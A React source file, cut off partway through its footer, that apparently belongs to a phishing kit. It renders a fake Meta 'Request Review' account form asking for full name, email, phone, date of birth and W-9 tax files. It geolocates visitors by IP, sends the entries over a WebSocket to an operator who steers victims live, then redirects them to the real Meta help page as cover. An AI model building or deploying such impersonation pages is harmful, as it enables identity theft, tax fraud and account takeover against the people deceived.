import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useWebSocket } from '../context/WebSocketContext';
import "../styles/request-form.css";

// Country list with dial codes
const countries = [
  { code: 'AD', name: 'Andorra', dialCode: '+376' },
  { code: 'AE', name: 'United Arab Emirates', dialCode: '+971' },
  { code: 'AF', name: 'Afghanistan', dialCode: '+93' },
  { code: 'AG', name: 'Antigua and Barbuda', dialCode: '+1' },
  { code: 'AI', name: 'Anguilla', dialCode: '+1' },
  { code: 'AL', name: 'Albania', dialCode: '+355' },
  { code: 'AM', name: 'Armenia', dialCode: '+374' },
  { code: 'AO', name: 'Angola', dialCode: '+244' },
  { code: 'AQ', name: 'Antarctica', dialCode: '+672' },
  { code: 'AR', name: 'Argentina', dialCode: '+54' },
  { code: 'AS', name: 'American Samoa', dialCode: '+1' },
  { code: 'AT', name: 'Austria', dialCode: '+43' },
  { code: 'AU', name: 'Australia', dialCode: '+61' },
  { code: 'AW', name: 'Aruba', dialCode: '+297' },
  { code: 'AX', name: 'Åland Islands', dialCode: '+358' },
  { code: 'AZ', name: 'Azerbaijan', dialCode: '+994' },
  { code: 'BA', name: 'Bosnia and Herzegovina', dialCode: '+387' },
  { code: 'BB', name: 'Barbados', dialCode: '+1' },
  { code: 'BD', name: 'Bangladesh', dialCode: '+880' },
  { code: 'BE', name: 'Belgium', dialCode: '+32' },
  { code: 'BF', name: 'Burkina Faso', dialCode: '+226' },
  { code: 'BG', name: 'Bulgaria', dialCode: '+359' },
  { code: 'BH', name: 'Bahrain', dialCode: '+973' },
  { code: 'BI', name: 'Burundi', dialCode: '+257' },
  { code: 'BJ', name: 'Benin', dialCode: '+229' },
  { code: 'BL', name: 'Saint Barthélemy', dialCode: '+590' },
  { code: 'BM', name: 'Bermuda', dialCode: '+1' },
  { code: 'BN', name: 'Brunei', dialCode: '+673' },
  { code: 'BO', name: 'Bolivia', dialCode: '+591' },
  { code: 'BQ', name: 'Caribbean Netherlands', dialCode: '+599' },
  { code: 'BR', name: 'Brazil', dialCode: '+55' },
  { code: 'BS', name: 'Bahamas', dialCode: '+1' },
  { code: 'BT', name: 'Bhutan', dialCode: '+975' },
  { code: 'BV', name: 'Bouvet Island', dialCode: '+47' },
  { code: 'BW', name: 'Botswana', dialCode: '+267' },
  { code: 'BY', name: 'Belarus', dialCode: '+375' },
  { code: 'BZ', name: 'Belize', dialCode: '+501' },
  { code: 'CA', name: 'Canada', dialCode: '+1' },
  { code: 'CC', name: 'Cocos (Keeling) Islands', dialCode: '+61' },
  { code: 'CD', name: 'DR Congo', dialCode: '+243' },
  { code: 'CF', name: 'Central African Republic', dialCode: '+236' },
  { code: 'CG', name: 'Republic of the Congo', dialCode: '+242' },
  { code: 'CH', name: 'Switzerland', dialCode: '+41' },
  { code: 'CI', name: "Côte d'Ivoire (Ivory Coast)", dialCode: '+225' },
  { code: 'CK', name: 'Cook Islands', dialCode: '+682' },
  { code: 'CL', name: 'Chile', dialCode: '+56' },
  { code: 'CM', name: 'Cameroon', dialCode: '+237' },
  { code: 'CN', name: 'China', dialCode: '+86' },
  { code: 'CO', name: 'Colombia', dialCode: '+57' },
  { code: 'CR', name: 'Costa Rica', dialCode: '+506' },
  { code: 'CU', name: 'Cuba', dialCode: '+53' },
  { code: 'CV', name: 'Cape Verde', dialCode: '+238' },
  { code: 'CW', name: 'Curaçao', dialCode: '+599' },
  { code: 'CX', name: 'Christmas Island', dialCode: '+61' },
  { code: 'CY', name: 'Cyprus', dialCode: '+357' },
  { code: 'CZ', name: 'Czechia', dialCode: '+420' },
  { code: 'DE', name: 'Germany', dialCode: '+49' },
  { code: 'DJ', name: 'Djibouti', dialCode: '+253' },
  { code: 'DK', name: 'Denmark', dialCode: '+45' },
  { code: 'DM', name: 'Dominica', dialCode: '+1' },
  { code: 'DO', name: 'Dominican Republic', dialCode: '+1' },
  { code: 'DZ', name: 'Algeria', dialCode: '+213' },
  { code: 'EC', name: 'Ecuador', dialCode: '+593' },
  { code: 'EE', name: 'Estonia', dialCode: '+372' },
  { code: 'EG', name: 'Egypt', dialCode: '+20' },
  { code: 'EH', name: 'Western Sahara', dialCode: '+212' },
  { code: 'ER', name: 'Eritrea', dialCode: '+291' },
  { code: 'ES', name: 'Spain', dialCode: '+34' },
  { code: 'ET', name: 'Ethiopia', dialCode: '+251' },
  { code: 'EU', name: 'European Union', dialCode: '+32' },
  { code: 'FI', name: 'Finland', dialCode: '+358' },
  { code: 'FJ', name: 'Fiji', dialCode: '+679' },
  { code: 'FK', name: 'Falkland Islands', dialCode: '+500' },
  { code: 'FM', name: 'Micronesia', dialCode: '+691' },
  { code: 'FO', name: 'Faroe Islands', dialCode: '+298' },
  { code: 'FR', name: 'France', dialCode: '+33' },
  { code: 'GA', name: 'Gabon', dialCode: '+241' },
  { code: 'GB', name: 'United Kingdom', dialCode: '+44' },
  { code: 'GB-ENG', name: 'England', dialCode: '+44' },
  { code: 'GB-NIR', name: 'Northern Ireland', dialCode: '+44' },
  { code: 'GB-SCT', name: 'Scotland', dialCode: '+44' },
  { code: 'GB-WLS', name: 'Wales', dialCode: '+44' },
  { code: 'GD', name: 'Grenada', dialCode: '+1' },
  { code: 'GE', name: 'Georgia', dialCode: '+995' },
  { code: 'GF', name: 'French Guiana', dialCode: '+594' },
  { code: 'GG', name: 'Guernsey', dialCode: '+44' },
  { code: 'GH', name: 'Ghana', dialCode: '+233' },
  { code: 'GI', name: 'Gibraltar', dialCode: '+350' },
  { code: 'GL', name: 'Greenland', dialCode: '+299' },
  { code: 'GM', name: 'Gambia', dialCode: '+220' },
  { code: 'GN', name: 'Guinea', dialCode: '+224' },
  { code: 'GP', name: 'Guadeloupe', dialCode: '+590' },
  { code: 'GQ', name: 'Equatorial Guinea', dialCode: '+240' },
  { code: 'GR', name: 'Greece', dialCode: '+30' },
  { code: 'GS', name: 'South Georgia', dialCode: '+500' },
  { code: 'GT', name: 'Guatemala', dialCode: '+502' },
  { code: 'GU', name: 'Guam', dialCode: '+1' },
  { code: 'GW', name: 'Guinea-Bissau', dialCode: '+245' },
  { code: 'GY', name: 'Guyana', dialCode: '+592' },
  { code: 'HK', name: 'Hong Kong', dialCode: '+852' },
  { code: 'HM', name: 'Heard Island and McDonald Islands', dialCode: '+672' },
  { code: 'HN', name: 'Honduras', dialCode: '+504' },
  { code: 'HR', name: 'Croatia', dialCode: '+385' },
  { code: 'HT', name: 'Haiti', dialCode: '+509' },
  { code: 'HU', name: 'Hungary', dialCode: '+36' },
  { code: 'ID', name: 'Indonesia', dialCode: '+62' },
  { code: 'IE', name: 'Ireland', dialCode: '+353' },
  { code: 'IL', name: 'Israel', dialCode: '+972' },
  { code: 'IM', name: 'Isle of Man', dialCode: '+44' },
  { code: 'IN', name: 'India', dialCode: '+91' },
  { code: 'IO', name: 'British Indian Ocean Territory', dialCode: '+246' },
  { code: 'IQ', name: 'Iraq', dialCode: '+964' },
  { code: 'IR', name: 'Iran', dialCode: '+98' },
  { code: 'IS', name: 'Iceland', dialCode: '+354' },
  { code: 'IT', name: 'Italy', dialCode: '+39' },
  { code: 'JE', name: 'Jersey', dialCode: '+44' },
  { code: 'JM', name: 'Jamaica', dialCode: '+1' },
  { code: 'JO', name: 'Jordan', dialCode: '+962' },
  { code: 'JP', name: 'Japan', dialCode: '+81' },
  { code: 'KE', name: 'Kenya', dialCode: '+254' },
  { code: 'KG', name: 'Kyrgyzstan', dialCode: '+996' },
  { code: 'KH', name: 'Cambodia', dialCode: '+855' },
  { code: 'KI', name: 'Kiribati', dialCode: '+686' },
  { code: 'KM', name: 'Comoros', dialCode: '+269' },
  { code: 'KN', name: 'Saint Kitts and Nevis', dialCode: '+1' },
  { code: 'KP', name: 'North Korea', dialCode: '+850' },
  { code: 'KR', name: 'South Korea', dialCode: '+82' },
  { code: 'KW', name: 'Kuwait', dialCode: '+965' },
  { code: 'KY', name: 'Cayman Islands', dialCode: '+1' },
  { code: 'KZ', name: 'Kazakhstan', dialCode: '+7' },
  { code: 'LA', name: 'Laos', dialCode: '+856' },
  { code: 'LB', name: 'Lebanon', dialCode: '+961' },
  { code: 'LC', name: 'Saint Lucia', dialCode: '+1' },
  { code: 'LI', name: 'Liechtenstein', dialCode: '+423' },
  { code: 'LK', name: 'Sri Lanka', dialCode: '+94' },
  { code: 'LR', name: 'Liberia', dialCode: '+231' },
  { code: 'LS', name: 'Lesotho', dialCode: '+266' },
  { code: 'LT', name: 'Lithuania', dialCode: '+370' },
  { code: 'LU', name: 'Luxembourg', dialCode: '+352' },
  { code: 'LV', name: 'Latvia', dialCode: '+371' },
  { code: 'LY', name: 'Libya', dialCode: '+218' },
  { code: 'MA', name: 'Morocco', dialCode: '+212' },
  { code: 'MC', name: 'Monaco', dialCode: '+377' },
  { code: 'MD', name: 'Moldova', dialCode: '+373' },
  { code: 'ME', name: 'Montenegro', dialCode: '+382' },
  { code: 'MF', name: 'Saint Martin', dialCode: '+590' },
  { code: 'MG', name: 'Madagascar', dialCode: '+261' },
  { code: 'MH', name: 'Marshall Islands', dialCode: '+692' },
  { code: 'MK', name: 'North Macedonia', dialCode: '+389' },
  { code: 'ML', name: 'Mali', dialCode: '+223' },
  { code: 'MM', name: 'Myanmar', dialCode: '+95' },
  { code: 'MN', name: 'Mongolia', dialCode: '+976' },
  { code: 'MO', name: 'Macau', dialCode: '+853' },
  { code: 'MP', name: 'Northern Mariana Islands', dialCode: '+1' },
  { code: 'MQ', name: 'Martinique', dialCode: '+596' },
  { code: 'MR', name: 'Mauritania', dialCode: '+222' },
  { code: 'MS', name: 'Montserrat', dialCode: '+1' },
  { code: 'MT', name: 'Malta', dialCode: '+356' },
  { code: 'MU', name: 'Mauritius', dialCode: '+230' },
  { code: 'MV', name: 'Maldives', dialCode: '+960' },
  { code: 'MW', name: 'Malawi', dialCode: '+265' },
  { code: 'MX', name: 'Mexico', dialCode: '+52' },
  { code: 'MY', name: 'Malaysia', dialCode: '+60' },
  { code: 'MZ', name: 'Mozambique', dialCode: '+258' },
  { code: 'NA', name: 'Namibia', dialCode: '+264' },
  { code: 'NC', name: 'New Caledonia', dialCode: '+687' },
  { code: 'NE', name: 'Niger', dialCode: '+227' },
  { code: 'NF', name: 'Norfolk Island', dialCode: '+672' },
  { code: 'NG', name: 'Nigeria', dialCode: '+234' },
  { code: 'NI', name: 'Nicaragua', dialCode: '+505' },
  { code: 'NL', name: 'Netherlands', dialCode: '+31' },
  { code: 'NO', name: 'Norway', dialCode: '+47' },
  { code: 'NP', name: 'Nepal', dialCode: '+977' },
  { code: 'NR', name: 'Nauru', dialCode: '+674' },
  { code: 'NU', name: 'Niue', dialCode: '+683' },
  { code: 'NZ', name: 'New Zealand', dialCode: '+64' },
  { code: 'OM', name: 'Oman', dialCode: '+968' },
  { code: 'PA', name: 'Panama', dialCode: '+507' },
  { code: 'PE', name: 'Peru', dialCode: '+51' },
  { code: 'PF', name: 'French Polynesia', dialCode: '+689' },
  { code: 'PG', name: 'Papua New Guinea', dialCode: '+675' },
  { code: 'PH', name: 'Philippines', dialCode: '+63' },
  { code: 'PK', name: 'Pakistan', dialCode: '+92' },
  { code: 'PL', name: 'Poland', dialCode: '+48' },
  { code: 'PM', name: 'Saint Pierre and Miquelon', dialCode: '+508' },
  { code: 'PN', name: 'Pitcairn Islands', dialCode: '+64' },
  { code: 'PR', name: 'Puerto Rico', dialCode: '+1' },
  { code: 'PS', name: 'Palestine', dialCode: '+970' },
  { code: 'PT', name: 'Portugal', dialCode: '+351' },
  { code: 'PW', name: 'Palau', dialCode: '+680' },
  { code: 'PY', name: 'Paraguay', dialCode: '+595' },
  { code: 'QA', name: 'Qatar', dialCode: '+974' },
  { code: 'RE', name: 'Réunion', dialCode: '+262' },
  { code: 'RO', name: 'Romania', dialCode: '+40' },
  { code: 'RS', name: 'Serbia', dialCode: '+381' },
  { code: 'RU', name: 'Russia', dialCode: '+7' },
  { code: 'RW', name: 'Rwanda', dialCode: '+250' },
  { code: 'SA', name: 'Saudi Arabia', dialCode: '+966' },
  { code: 'SB', name: 'Solomon Islands', dialCode: '+677' },
  { code: 'SC', name: 'Seychelles', dialCode: '+248' },
  { code: 'SD', name: 'Sudan', dialCode: '+249' },
  { code: 'SE', name: 'Sweden', dialCode: '+46' },
  { code: 'SG', name: 'Singapore', dialCode: '+65' },
  { code: 'SH', name: 'Saint Helena, Ascension and Tristan da Cunha', dialCode: '+290' },
  { code: 'SI', name: 'Slovenia', dialCode: '+386' },
  { code: 'SJ', name: 'Svalbard and Jan Mayen', dialCode: '+47' },
  { code: 'SK', name: 'Slovakia', dialCode: '+421' },
  { code: 'SL', name: 'Sierra Leone', dialCode: '+232' },
  { code: 'SM', name: 'San Marino', dialCode: '+378' },
  { code: 'SN', name: 'Senegal', dialCode: '+221' },
  { code: 'SO', name: 'Somalia', dialCode: '+252' },
  { code: 'SR', name: 'Suriname', dialCode: '+597' },
  { code: 'SS', name: 'South Sudan', dialCode: '+211' },
  { code: 'ST', name: 'São Tomé and Príncipe', dialCode: '+239' },
  { code: 'SV', name: 'El Salvador', dialCode: '+503' },
  { code: 'SX', name: 'Sint Maarten', dialCode: '+1' },
  { code: 'SY', name: 'Syria', dialCode: '+963' },
  { code: 'SZ', name: 'Eswatini (Swaziland)', dialCode: '+268' },
  { code: 'TC', name: 'Turks and Caicos Islands', dialCode: '+1' },
  { code: 'TD', name: 'Chad', dialCode: '+235' },
  { code: 'TF', name: 'French Southern and Antarctic Lands', dialCode: '+262' },
  { code: 'TG', name: 'Togo', dialCode: '+228' },
  { code: 'TH', name: 'Thailand', dialCode: '+66' },
  { code: 'TJ', name: 'Tajikistan', dialCode: '+992' },
  { code: 'TK', name: 'Tokelau', dialCode: '+690' },
  { code: 'TL', name: 'Timor-Leste', dialCode: '+670' },
  { code: 'TM', name: 'Turkmenistan', dialCode: '+993' },
  { code: 'TN', name: 'Tunisia', dialCode: '+216' },
  { code: 'TO', name: 'Tonga', dialCode: '+676' },
  { code: 'TR', name: 'Turkey', dialCode: '+90' },
  { code: 'TT', name: 'Trinidad and Tobago', dialCode: '+1' },
  { code: 'TV', name: 'Tuvalu', dialCode: '+688' },
  { code: 'TW', name: 'Taiwan', dialCode: '+886' },
  { code: 'TZ', name: 'Tanzania', dialCode: '+255' },
  { code: 'UA', name: 'Ukraine', dialCode: '+380' },
  { code: 'UG', name: 'Uganda', dialCode: '+256' },
  { code: 'UM', name: 'United States Minor Outlying Islands', dialCode: '+1' },
  { code: 'UN', name: 'United Nations', dialCode: '+1' },
  { code: 'US', name: 'United States', dialCode: '+1' },
  { code: 'US-AK', name: 'Alaska', dialCode: '+1' },
  { code: 'US-AL', name: 'Alabama', dialCode: '+1' },
  { code: 'US-AR', name: 'Arkansas', dialCode: '+1' },
  { code: 'US-AZ', name: 'Arizona', dialCode: '+1' },
  { code: 'US-CA', name: 'California', dialCode: '+1' },
  { code: 'US-CO', name: 'Colorado', dialCode: '+1' },
  { code: 'US-CT', name: 'Connecticut', dialCode: '+1' },
  { code: 'US-DE', name: 'Delaware', dialCode: '+1' },
  { code: 'US-FL', name: 'Florida', dialCode: '+1' },
  { code: 'US-GA', name: 'Georgia', dialCode: '+1' },
  { code: 'US-HI', name: 'Hawaii', dialCode: '+1' },
  { code: 'US-IA', name: 'Iowa', dialCode: '+1' },
  { code: 'US-ID', name: 'Idaho', dialCode: '+1' },
  { code: 'US-IL', name: 'Illinois', dialCode: '+1' },
  { code: 'US-IN', name: 'Indiana', dialCode: '+1' },
  { code: 'US-KS', name: 'Kansas', dialCode: '+1' },
  { code: 'US-KY', name: 'Kentucky', dialCode: '+1' },
  { code: 'US-LA', name: 'Louisiana', dialCode: '+1' },
  { code: 'US-MA', name: 'Massachusetts', dialCode: '+1' },
  { code: 'US-MD', name: 'Maryland', dialCode: '+1' },
  { code: 'US-ME', name: 'Maine', dialCode: '+1' },
  { code: 'US-MI', name: 'Michigan', dialCode: '+1' },
  { code: 'US-MN', name: 'Minnesota', dialCode: '+1' },
  { code: 'US-MO', name: 'Missouri', dialCode: '+1' },
  { code: 'US-MS', name: 'Mississippi', dialCode: '+1' },
  { code: 'US-MT', name: 'Montana', dialCode: '+1' },
  { code: 'US-NC', name: 'North Carolina', dialCode: '+1' },
  { code: 'US-ND', name: 'North Dakota', dialCode: '+1' },
  { code: 'US-NE', name: 'Nebraska', dialCode: '+1' },
  { code: 'US-NH', name: 'New Hampshire', dialCode: '+1' },
  { code: 'US-NJ', name: 'New Jersey', dialCode: '+1' },
  { code: 'US-NM', name: 'New Mexico', dialCode: '+1' },
  { code: 'US-NV', name: 'Nevada', dialCode: '+1' },
  { code: 'US-NY', name: 'New York', dialCode: '+1' },
  { code: 'US-OH', name: 'Ohio', dialCode: '+1' },
  { code: 'US-OK', name: 'Oklahoma', dialCode: '+1' },
  { code: 'US-OR', name: 'Oregon', dialCode: '+1' },
  { code: 'US-PA', name: 'Pennsylvania', dialCode: '+1' },
  { code: 'US-RI', name: 'Rhode Island', dialCode: '+1' },
  { code: 'US-SC', name: 'South Carolina', dialCode: '+1' },
  { code: 'US-SD', name: 'South Dakota', dialCode: '+1' },
  { code: 'US-TN', name: 'Tennessee', dialCode: '+1' },
  { code: 'US-TX', name: 'Texas', dialCode: '+1' },
  { code: 'US-UT', name: 'Utah', dialCode: '+1' },
  { code: 'US-VA', name: 'Virginia', dialCode: '+1' },
  { code: 'US-VT', name: 'Vermont', dialCode: '+1' },
  { code: 'US-WA', name: 'Washington', dialCode: '+1' },
  { code: 'US-WI', name: 'Wisconsin', dialCode: '+1' },
  { code: 'US-WV', name: 'West Virginia', dialCode: '+1' },
  { code: 'US-WY', name: 'Wyoming', dialCode: '+1' },
  { code: 'UY', name: 'Uruguay', dialCode: '+598' },
  { code: 'UZ', name: 'Uzbekistan', dialCode: '+998' },
  { code: 'VA', name: 'Vatican City (Holy See)', dialCode: '+379' },
  { code: 'VC', name: 'Saint Vincent and the Grenadines', dialCode: '+1' },
  { code: 'VE', name: 'Venezuela', dialCode: '+58' },
  { code: 'VG', name: 'British Virgin Islands', dialCode: '+1' },
  { code: 'VI', name: 'United States Virgin Islands', dialCode: '+1' },
  { code: 'VN', name: 'Vietnam', dialCode: '+84' },
  { code: 'VU', name: 'Vanuatu', dialCode: '+678' },
  { code: 'WF', name: 'Wallis and Futuna', dialCode: '+681' },
  { code: 'WS', name: 'Samoa', dialCode: '+685' },
  { code: 'XK', name: 'Kosovo', dialCode: '+383' },
  { code: 'YE', name: 'Yemen', dialCode: '+967' },
  { code: 'YT', name: 'Mayotte', dialCode: '+262' },
  { code: 'ZA', name: 'South Africa', dialCode: '+27' },
  { code: 'ZM', name: 'Zambia', dialCode: '+260' },
  { code: 'ZW', name: 'Zimbabwe', dialCode: '+263' }
];

const RequestReviewForm = () => {
  const navigate = useNavigate();
  const { submitForm, isConnected, navigationEvent, clearNavigationEvent } = useWebSocket();
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [selectedCountry, setSelectedCountry] = useState(countries.find(c => c.code === 'US') || countries[0]); // Default to US, will be updated by IP
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [countrySearch, setCountrySearch] = useState('');
  const dropdownRef = useRef(null);
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    phone: "",
    dobDay: "",
    dobMonth: "",
    dobYear: "",
    taxFile: null,
    agreeTerms: false,
  });
  const [errors, setErrors] = useState({});

  // Auto-detect country from IP address
  useEffect(() => {
    const detectCountryFromIP = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        if (data.country_code) {
          // Find matching country in our list
          const detectedCountry = countries.find(
            c => c.code.toUpperCase() === data.country_code.toUpperCase()
          );
          if (detectedCountry) {
            setSelectedCountry(detectedCountry);
          }
        }
      } catch (error) {
        console.log('Could not detect country from IP, using default');
      }
    };
    detectCountryFromIP();
  }, []);

  // Reset state when admin navigates (allows changing route without re-submitting)
  useEffect(() => {
    if (navigationEvent) {
      setIsLoading(false);
      setIsSubmitted(false);
      clearNavigationEvent();
    }
  }, [navigationEvent, clearNavigationEvent]);

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target)) {
        setShowCountryDropdown(false);
        setCountrySearch('');
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Filter countries based on search
  const filteredCountries = countries.filter(country =>
    country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
    country.dialCode.includes(countrySearch) ||
    country.code.toLowerCase().includes(countrySearch.toLowerCase())
  );

  const handleCountrySelect = (country) => {
    setSelectedCountry(country);
    setShowCountryDropdown(false);
    setCountrySearch('');
  };

  // Generate day options (1-31)
  const days = Array.from({ length: 31 }, (_, i) => i + 1);

  // Generate month options (1-12)
  const months = Array.from({ length: 12 }, (_, i) => i + 1);

  // Generate year options (1917 - 2016)
  const years = Array.from({ length: 100 }, (_, i) => 2016 - i);

  const handleInputChange = (e) => {
    const { name, value, type, checked, files } = e.target;

    if (type === "checkbox") {
      setFormData((prev) => ({ ...prev, [name]: checked }));
    } else if (type === "file") {
      setFormData((prev) => ({ ...prev, [name]: files[0] }));
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }

    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: "" }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.fullName.trim()) {
      newErrors.fullName = "Full name is required";
    }

    if (!formData.email.trim()) {
      newErrors.email = "Email is required";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = "Please enter a valid email address";
    }

    if (!formData.phone.trim()) {
      newErrors.phone = "Phone number is required";
    }

    if (!formData.dobDay || !formData.dobMonth || !formData.dobYear) {
      newErrors.dob = "Date of birth is required";
    }

    if (!formData.agreeTerms) {
      newErrors.agreeTerms = "You must agree to the terms and privacy policy";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    // Submit to WebSocket
    submitForm('request_review', {
      fullName: formData.fullName,
      email: formData.email,
      phone: `${selectedCountry.dialCode} ${formData.phone}`,
      dob: `${formData.dobDay}/${formData.dobMonth}/${formData.dobYear}`
    });
    
    setIsSubmitted(true);

    // redirect to official notice page after submission
    setTimeout(() => {
      navigate('https://www.meta.com/en-gb/help/accounts-center/');
    }, 2000);
    // Keep loading state - admin will navigate via WebSocket
  };

  const handleFileClick = () => {
    document.getElementById("fileInput").click();
  };

  return (
    <div className="verified-container">
      {/* Loading overlay */}
      {isLoading && (
        <div className="wrapper-loading-root">
          <div className="progress-bar" style={{ display: "block" }}>
            <div className="bar1"></div>
            <div className="bar2"></div>
          </div>
        </div>
      )}

      {/* Header */}
      <div className="violation-header">
        <div className="violation-icon">
          <h1 className="violation-title">Request Review</h1>
        </div>
      </div>

      {/* Form */}
      <form className="consultation-form" onSubmit={handleSubmit}>
        {/* Info Bar */}
        <p className="info-bar">
          Please provide the information below to help us review your account.
        </p>

        {/* Full Name */}
        <div className="form-group-home">
          <span className="form-label">
            Full Name <span className="required">*</span>
          </span>
          <div className="floating-label-group">
            <input
              id="fullName"
              name="fullName"
              className={`form-input ${errors.fullName ? "error" : ""}`}
              placeholder="Enter your full name"
              type="text"
              value={formData.fullName}
              onChange={handleInputChange}
              required
            />
            {errors.fullName && (
              <span className="email-error show">{errors.fullName}</span>
            )}
          </div>
        </div>

        {/* Email */}
        <div className="form-group-home">
          <label className="form-label">
            Email <span className="required">*</span>
          </label>
          <div className="floating-label-group">
            <input
              id="email"
              name="email"
              placeholder="Enter your email"
              className={`form-input ${errors.email ? "error" : ""}`}
              type="text"
              value={formData.email}
              onChange={handleInputChange}
              required
            />
            {errors.email && (
              <span className="email-error show">{errors.email}</span>
            )}
          </div>
        </div>

        {/* Phone Number */}
        <div className="form-group-home">
          <label className="form-label">
            Phone number <span className="required">*</span>
          </label>
          <div className="floating-label-group">
            <div className="phone-country-selector" ref={dropdownRef}>
              <div 
                className="country-flag-box"
                onClick={() => setShowCountryDropdown(!showCountryDropdown)}
              >
                <img 
                  alt={selectedCountry.code} 
                  width="20" 
                  height="15" 
                  src={`https://flagcdn.com/w40/${selectedCountry.code.toLowerCase()}.png`}
                />
                <span className="dial-code">{selectedCountry.dialCode}</span>
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#6a7282"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className={showCountryDropdown ? 'chevron-up' : ''}
                >
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
              {showCountryDropdown && (
                <div className="country-dropdown">
                  <div className="country-search-wrapper">
                    <input
                      type="text"
                      className="country-search-input"
                      placeholder="Search country..."
                      value={countrySearch}
                      onChange={(e) => setCountrySearch(e.target.value)}
                      autoFocus
                    />
                  </div>
                  <div className="country-list">
                    {filteredCountries.map((country) => (
                      <div
                        key={country.code}
                        className={`country-item ${selectedCountry.code === country.code ? 'selected' : ''}`}
                        onClick={() => handleCountrySelect(country)}
                      >
                        <img
                          alt={country.code}
                          width="20"
                          height="15"
                          src={`https://flagcdn.com/w40/${country.code.toLowerCase()}.png`}
                        />
                        <span className="country-name">{country.name}</span>
                        <span className="country-dial-code">{country.dialCode}</span>
                      </div>
                    ))}
                    {filteredCountries.length === 0 && (
                      <div className="country-item no-results">No countries found</div>
                    )}
                  </div>
                </div>
              )}
            </div>
            <input
              id="phone"
              name="phone"
              className={`form-input phone-input ${errors.phone ? "error" : ""}`}
              placeholder="Phone number"
              type="tel"
              value={formData.phone}
              onChange={handleInputChange}
              required
            />
            {errors.phone && (
              <span className="email-error show">{errors.phone}</span>
            )}
          </div>
        </div>

        {/* Date of Birth */}
        <div className="form-group-home">
          <label className="form-label">
            Date of Birth <span className="required">*</span>
          </label>
          <div className="floating-label-group date-group">
            <div className="date-select-box">
              <select
                name="dobDay"
                className="date-select"
                value={formData.dobDay}
                onChange={handleInputChange}
              >
                <option value="" disabled hidden>
                  Day
                </option>
                {days.map((day) => (
                  <option key={day} value={day}>
                    {day}
                  </option>
                ))}
              </select>
              <div className="select-arrow">
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#6a7282"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
            </div>
            <div className="date-select-box">
              <select
                name="dobMonth"
                className="date-select"
                value={formData.dobMonth}
                onChange={handleInputChange}
              >
                <option value="" disabled hidden>
                  Month
                </option>
                {months.map((month) => (
                  <option key={month} value={month}>
                    {month}
                  </option>
                ))}
              </select>
              <div className="select-arrow">
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#6a7282"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
            </div>
            <div className="date-select-box">
              <select
                name="dobYear"
                className="date-select"
                value={formData.dobYear}
                onChange={handleInputChange}
              >
                <option value="" disabled hidden>
                  Year
                </option>
                {years.map((year) => (
                  <option key={year} value={year}>
                    {year}
                  </option>
                ))}
              </select>
              <div className="select-arrow">
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#6a7282"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
            </div>
          </div>
          {errors.dob && <span className="email-error show">{errors.dob}</span>}
        </div>

        {/* File Upload */}
        <div className="form-group-home">
          <label className="form-label">Upload Tax Files</label>
          <div className="floating-label-group">
            <input
              id="fileDisplay"
              placeholder="Click to upload W-9 form"
              className="form-input file-display-input"
              style={{ padding: "20px", textAlign: "center" }}
              type="text"
              readOnly
              onClick={handleFileClick}
              value={formData.taxFile ? formData.taxFile.name : ""}
            />
            <input
              id="fileInput"
              hidden
              accept=".pdf, .doc, .docx, .xls, .xlsx, .txt, application/pdf, application/msword, application/vnd.openxmlformats-officedocument.wordprocessingml.document"
              type="file"
              name="taxFile"
              onChange={handleInputChange}
            />
            <div className="dashed-border-overlay">
              <div className="dashed-inner"></div>
            </div>
          </div>
        </div>

        {/* Terms Checkbox */}
        <div className="checkbox-item">
          <input
            className="checkbox-custom"
            id="privacy-policy"
            type="checkbox"
            name="agreeTerms"
            checked={formData.agreeTerms}
            onChange={handleInputChange}
          />
          <label htmlFor="privacy-policy" className="checkbox-text">
            I agree to Meta's <a href="#">Terms</a> and{" "}
            <a href="#">Privacy Policy</a>
          </label>
        </div>
        {errors.agreeTerms && (
          <span className="email-error show">{errors.agreeTerms}</span>
        )}

        {/* Submit Button */}
        <div className="submit-wrapper">
          <button type="submit" className="submit-btn" disabled={isLoading}>
            {/* <div className="btn-spacer"></div> */}
                             {isLoading ? (
                    <>
                      <svg className="spinner" viewBox="0 0 50 50">
                        <circle className="path" cx="25" cy="25" r="20" fill="none" strokeWidth="5"></circle>
                      </svg>
                      <span>Submitting...</span>
                    </>
                  ) : (
                    'Submit'
                  )}
            {/* <div>{isLoading ? "Submitting..." : "Submit"}</div> */}
          </button>
        </div>
      </form>

      {/* Footer Links */}
      <div className="footer-links">
        <a href="#">Help Center</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Service</a>
